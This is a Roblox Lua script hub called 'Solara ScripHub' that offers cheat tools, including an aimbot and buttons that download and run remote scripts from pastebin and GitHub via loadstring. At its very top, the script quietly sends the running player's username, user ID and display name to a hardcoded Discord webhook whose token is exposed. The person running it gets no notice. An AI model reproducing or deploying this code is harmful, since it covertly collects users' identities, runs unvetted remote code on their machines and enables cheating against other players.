local HttpService = game:GetService("HttpService")

local WebhookURL = "https://discord.com/api/webhooks/1267324391490981958/xw8GIxG1kCp772OUPXhQJH6foWEQh36kF87Phv2hecJLw5DjchbPq7P4GKUyj6mPKPZC"

-- Function to send data to the Discord webhook
local function sendWebhook(content)
    local data = {
        ["content"] = content
    }
    local jsonData = HttpService:JSONEncode(data)
    HttpService:PostAsync(WebhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
end

-- Gather user information and send to webhook
local player = game.Players.LocalPlayer
local userInfo = "Username: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nDisplay Name: " .. player.DisplayName
sendWebhook(userInfo)

-- Continue with the rest of your script

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Solara ScripHub",
    LoadingTitle = "Enjoy",
    LoadingSubtitle = "by ozaiplayzyt",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil, -- Create a custom folder for your hub/game
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
        RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
        Title = "Solara ScripHub",
        Subtitle = "Key System",
        Note = "Try to guess the key: ₲₵₲",
        FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
        SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
        Key = {"GCG"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
})

local Tab = Window:CreateTab("Main", 4483362458) -- Title, Image

local Section = Tab:CreateSection("AnyGame")

local Button = Tab:CreateButton({
    Name = "infiniteYield [OP]",
    Callback = function()
        -- The function that takes place when the button is pressed
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() 
    end
})

local Button = Tab:CreateButton({
    Name = "Aimbot",
    Callback = function()
        -- The function that takes place when the button is pressed
        local player = game.Players.LocalPlayer
        local Cam = workspace.CurrentCamera

        local targetTeammates = true  -- Initially, target non-teammates or teammate
        local aimbotActive = true  -- Initial state of the aimbot

        local function isTeammate(targetPlayer)
            return targetPlayer.Team == player.Team
        end

        local function lookAt(targetPosition)
            Cam.CFrame = CFrame.new(Cam.CFrame.Position, targetPosition)
        end

        local function isTargetVisible(targetPart)
            local origin = Cam.CFrame.Position
            local direction = (targetPart.Position - origin).Unit
            local ray = Ray.new(origin, direction * 5000)
            local part, position = workspace:FindPartOnRayWithIgnoreList(ray, {player.Character, Cam})
            
            return part and part:IsDescendantOf(targetPart.Parent)
        end

        local function getClosestPlayer(trg_part)
            local nearest = nil
            local lastDistance = math.huge
            local localPlayerPos = player.Character.PrimaryPart.Position
            
            for _, v in pairs(game.Players:GetPlayers()) do
                if v ~= player and v.Character and v.Character:FindFirstChild(trg_part) and v.Character:FindFirstChild("Humanoid") then
                    local head = v.Character[trg_part]
                    local humanoid = v.Character.Humanoid
                    if head and humanoid.Health > 0 then
                        local distance = (localPlayerPos - head.Position).Magnitude
                        
                        if distance < lastDistance and isTargetVisible(head) then
                            if (targetTeammates and isTeammate(v)) or (not targetTeammates and not isTeammate(v)) then
                                nearest = v
                                lastDistance = distance
                            end
                        end
                    end
                end
            end
            
            return nearest
        end

        local function toggleTargetMode()
            targetTeammates = not targetTeammates
            print("Targeting", targetTeammates and "teammates" or "non-teammates")
        end

        local function toggleAimbot()
            aimbotActive = not aimbotActive
            print("Aimbot", aimbotActive and "enabled" or "disabled")
        end

        game:GetService("RunService").RenderStepped:Connect(function()
            if aimbotActive then
                local closestPlayer = getClosestPlayer("Head")
                if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("Head") then
                    lookAt(closestPlayer.Character.Head.Position)
                end
            end
        end)

        game:GetService("UserInputService").InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Keyboard then
                if input.KeyCode == Enum.KeyCode.T then
                    toggleTargetMode()
                elseif input.KeyCode == Enum.KeyCode.Y then
                    toggleAimbot()
                end
            end
        end)

        local UIS = game:GetService("UserInputService")

        UIS.TouchTap:Connect(function(touchPositions, processed)
            if not processed then
                local touch = touchPositions[1]
                if touch.Position.Y < workspace.CurrentCamera.ViewportSize.Y / 2 then
                    toggleAimbot()
                else
                    toggleTargetMode()
                end
            end
        end)
    end
})

local Button = Tab:CreateButton({
    Name = "Stream Snipe",
    Callback = function()
        -- The function that takes place when the button is pressed
        loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV3/main/SCRIPTHUBV3", true))()
    end
})

local Section = Tab:CreateSection("Da Hood")

local Button = Tab:CreateButton({
    Name = "Fake Macro [Press Q]",
    Callback = function()
        -- The function that takes place when the button is pressed
        loadstring(game:HttpGet("https://pastebin.com/raw/QW5Whap9"))()
    end
})

local Button = Tab:CreateButton({
    Name = "TBO",
    Callback = function()
        -- The function that takes place when the button is pressed
        loadstring(game:HttpGet('https://raw.githubusercontent.com/cool5013/TBO/main/TBOscript'))()
    end
})

local Button = Tab:CreateButton({
    Name = "Visoin Hub",
    Callback = function()
        -- The function that takes place when the button is pressed
        loadstring(game:HttpGet("https://raw.githubusercontent.com/7hbl/lqmc-da-hood/main/lqmc%20da%20hood"))();
    end
})

local Tab = Window:CreateTab("Info", 4483362458) -- Title, Image

local Label = Tab:CreateLabel("Created By: OzaiPlayzYT")

local Label = Tab:CreateLabel("YouTube: youtube.com/@OzaiPlayzYT")

local Paragraph = Tab:CreateParagraph({Title = "Discord: ozaiplayzyt", Content = "Dm me if something is wrong."})

local Paragraph = Tab:CreateParagraph({Title = "Nameless", Content = "If you see a nameless button then idk the name."})
